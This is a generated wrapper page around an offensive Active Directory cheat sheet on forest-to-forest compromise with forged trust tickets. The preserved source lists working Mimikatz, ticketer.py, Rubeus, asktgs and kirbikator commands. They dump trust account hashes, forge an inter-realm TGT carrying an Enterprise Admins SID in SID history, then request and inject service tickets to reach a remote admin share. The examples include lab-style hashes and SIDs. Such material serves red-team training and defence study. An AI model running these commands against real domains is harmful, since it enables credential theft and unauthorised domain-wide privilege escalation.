---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Forest to Forest Compromise - Trust Ticket

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-trust-ticket` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-ticket.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Forest to Forest Compromise - Trust Ticket](../../topics/active-directory/forest-to-forest-compromise-trust-ticket.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-trust-ticket |
| name | Forest to Forest Compromise - Trust Ticket |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/trust-ticket.md |

## Preserved Source Material

````yaml
_body: "# Forest to Forest Compromise - Trust Ticket\n\n* Require: SID filtering disabled\n\nFrom the DC, dump the hash of\
  \ the `currentdomain\\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust\
  \ key and the domain SIDs, forge an inter-realm TGT using\nMimikatz, adding the SID for the target domain's enterprise admins\
  \ group to our **SID history**.\n\n## Dumping Trust Passwords (trust keys)\n\n> Look for the trust name with a dollar ($)\
  \ sign at the end. Most of the accounts with a trailing **$** are computer accounts, but some are trust accounts.\n\n```powershell\n\
  lsadump::trust /patch\n\nor find the TRUST_NAME$ machine account hash\n```\n\n## Create a Forged Trust Ticket (inter-realm\
  \ TGT)\n\n* using **Mimikatz**\n\n    ```powershell\n    mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21...\
  \ /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi\n    mimikatz(commandline)\
  \ # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519\
  \ /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\\
  mcorp-ticket.kirbi\n    ```\n\n* using **Ticketer**\n\n    ```ps1\n    ticketer.py -nthash <NT_HASH> -domain-sid <S-1-5-21-SID>\
  \ -domain <domain.lab> -extra-sid <S-1-5-21-SID_ENTERPRISE_ADM-519> -spn <krbtgt/domain.lab> <dummy name> \n\n    # -nthash:\
  \ The hash to authenticate as the trust account.\n    # -domain-sid: The SID for the domain that the account is valid in.\
  \ \n    # -domain: The domain which the creds are valid on.\n    # -extra-sid: The SID for Enterprise Admin's Group\n  \
  \  # -spn: The target service for the other domain\n    # <dummy name>: The user doesn't have to be real.\n    ```\n\n##\
  \ Use the Trust Ticket file to get a Service Ticket\n\n```powershell\n.\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local\n\
  .\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local\
  \ /ptt\n```\n\nInject the Service Ticket file and access the targeted service with the spoofed rights.\n\n```powershell\n\
  kirbikator lsa .\\ticket.kirbi\nls \\\\machine.domain.local\\c$\n```\n\n## References\n\n* [Training - Attacking and Defending\
  \ Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)"
_relative_path: active-directory/trust-ticket.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-ticket.md
````
